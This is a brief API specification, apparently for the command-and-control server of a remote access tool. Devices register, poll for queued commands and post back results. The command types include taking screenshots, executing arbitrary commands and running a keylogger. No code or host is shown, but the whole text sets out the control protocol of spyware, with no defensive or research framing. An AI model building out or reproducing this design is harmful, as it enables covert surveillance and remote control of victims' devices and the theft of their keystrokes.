## types

[ command ]
- screenshot : screenshot
- cmd : execute command
- keylog : run keylogger
- uid : unique id

## add new user 

url : /add

method : GET

params : {
  name : current device,
}

res : 'error' | 'success'

## fetch command

url : /fetch

method : GET

params : {
  name : current device,
}

res : [ {} ]

## add new command

url : /cmd

method : GET

params : {
  target : cmd target,
  type : command type,
  data : cmd data
}

res : [ 'error' | 'success' ]

## put command result

url : /res

method : POST

params : {
  target,
  type,
  uid,
  res,
}

res : [ 'error' | 'success' ]